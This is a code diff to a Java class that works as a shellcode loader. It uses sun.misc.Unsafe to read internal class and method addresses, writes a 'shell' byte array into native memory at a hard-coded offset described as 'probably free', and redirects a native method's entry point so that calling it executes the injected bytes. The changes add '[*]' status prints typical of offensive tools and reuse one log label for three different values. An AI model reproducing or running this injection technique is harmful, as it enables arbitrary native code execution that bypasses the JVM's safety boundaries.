@@ -4,6 +4,7 @@ import sun.misc.SharedSecrets;
 import sun.misc.Unsafe;
 
 import java.nio.ByteBuffer;
+import java.util.Scanner;
 
 public class Done {
     @PlatformVariable("oopSize")
@@ -14,8 +15,8 @@ public class Done {
     static long _klass_offset;
     @PlatformVariable("heapField")
     static long _heap_offset;
-    @PlatformVariable("virtualSpaceMin")
-    static int virtualSpaceMin;
+    @PlatformVariable("virtualSpace")
+    static int virtualSpace;
     @PlatformVariable("methods")
     static long _methods;
     @PlatformVariable("methodsData")
@@ -24,6 +25,9 @@ public class Done {
     static int shellcodeLength;
 
     public static void main(String[] args) {
+        String jdkHash = Integer.toHexString((System.getProperty("java.vm.version") + System.getProperty("java.vm.vendor") + System.getProperty("sun.arch.data.model")).hashCode());
+        System.out.println("[*] Jdk hash: " + jdkHash);
+
         Unsafe unsafe;
         try {
             java.lang.reflect.Field f = Unsafe.class.getDeclaredField("theUnsafe");
@@ -33,16 +37,17 @@ public class Done {
             throw new RuntimeException("Unable to get Unsafe", e);
         }
 
+        // 00000184BEB872C8 - 184bea778a0
 
         long classAddress = unsafe.getLong(Done.class, unsafe.getInt(_klass_offset));
+        System.out.println("[*] Got class address: " + classAddress);
         long methodAddress = unsafe.getAddress(
                 unsafe.getAddress(classAddress + _methods) + _methods_data
                         + (long) 2 * oopSize);
+        System.out.println("[*] Got class address: " + methodAddress);
 
-        long nativePtrTarget = unsafe.getAddress(_heap_offset + virtualSpaceMin);
-
-       // System.out.printf("Class address: %16X%n", classAddress);
-       // System.out.printf("ERW page: %16X%n", nativePtrTarget);
+        long nativePtrTarget = unsafe.getAddress(_heap_offset + virtualSpace) + 0x10fa28; // 10fa28 - some random offset which will be probably free
+        System.out.println("[*] Got class address: " + nativePtrTarget);
 
         byte[] shell = new byte[shellcodeLength * 8];
         for (int i = 0; i < shellcodeLength; i++) {
@@ -55,11 +60,9 @@ public class Done {
             unsafe.putByte(nativePtrTarget + i, shell[i]);
         }
 
-        //  System.out.println("Putting...");
         unsafe.putAddress(methodAddress + _native_entry, nativePtrTarget);
-        //  System.out.println("Exec'n...");
 
-        nativer();
+        nativer(nativePtrTarget, 5);
     }
 
     /*
@@ -78,5 +81,5 @@ public class Done {
         return pid;
     }
      */
-    private static native void nativer();
+    private static native long nativer(long lon, int size);
 }
